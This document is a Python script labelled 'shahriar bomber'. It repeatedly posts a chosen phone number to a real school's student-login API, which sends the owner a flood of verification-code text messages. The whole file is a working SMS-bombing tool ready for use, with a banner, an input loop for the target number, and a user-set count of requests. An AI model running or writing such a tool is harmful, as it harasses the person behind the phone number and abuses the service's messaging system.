import requests
import os
import sys
from time import sleep
from colorama import Fore
from pystyle import Col , Center
loading = ['/', '|' ,'\ ' ,"-" ,'/', '|' ,'\ ' ,"-", '/', " ","\n"]
def main():
    url = "https://core.shahriareiran.com/api/student/login/request"

    logo = f"""{Fore.GREEN}
         __          __         _
   _____/ /_  ____ _/ /_  _____(_)___ ______
  / ___/ __ \/ __ `/ __ \/ ___/ / __ `/ ___/
 (__  ) / / / /_/ / / {Fore.CYAN}/ / /  / / /_/ / /
/____/_/ /_/\__,_/_/ /_/_/  /_/\__,_/_/
                                    {Fore.LIGHTRED_EX}
    __                    __
   / /_  ____  ____ ___  / /_  ___  _____
  / __ \/ __ \/ __ `__ \/ __ \/ _ \/ ___/
 / /_/ / /_/ / / / / / / /_/ /  __/ /
/_.___/\____/_/ /_/ /_/_.___/\___/_/



    """

    
    print(Center.XCenter(logo))

    try:
        # اعتبارسنجی شماره
        while True:
            number = input(
                f"{Fore.YELLOW}[!]{Col.gray} Enter the shahriar student number (09*********):{Fore.WHITE} "
            )
            if len(number) == 11 and number.isdigit():
                break
            else:
                print(f"{Fore.LIGHTRED_EX}Try again! Number must be 11 digits.{Fore.RESET}")

        payload = {
            "phone": number,
            "token": ""
        }

        A = int(input(f"{Fore.YELLOW}[!]{Col.gray} How many times to send code:{Fore.WHITE} "))

        for i in range(A):
            r = requests.post(url, json=payload)
            if i == 0:
                for g in loading:
                    sys.stdout.write(f"\r{Fore.YELLOW}[*]{Fore.GREEN}connecting to shahriar API {Fore.LIGHTWHITE_EX}{g}")
                    sys.stdout.flush()
                    sleep(0.3)
            elif i == 1:
                print(f"{Fore.YELLOW}[!]{Fore.LIGHTGREEN_EX}Connected !")
            else:
                print(f"{Fore.YELLOW}[+]{Fore.CYAN} {i} Code Sent")
            if r.status_code != 200:
                print(f"{Fore.LIGHTRED_EX}The number you entered is wrong or not a shahriar student!!")
                for g in range(10, -1, -1):
                    sys.stdout.write(f"\rrestarting at {g} sacond")
                    sys.stdout.flush()
                    sleep(1)
                
                os.system('cls' if os.name == 'nt' else 'clear')
                main()
                
        print (f"{Fore.GREEN}All tasks done.{Fore.RESET}")
    except KeyboardInterrupt:
        # وقتی Ctrl+C زده می‌شود
        print(f"\n{Fore.CYAN}Goodbye 👋{Fore.RESET}")

    except ValueError:
        # اگر عدد اشتباه وارد شود
        print(f"{Fore.LIGHTRED_EX}Invalid input! Please enter a number.{Fore.RESET}")

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    main()
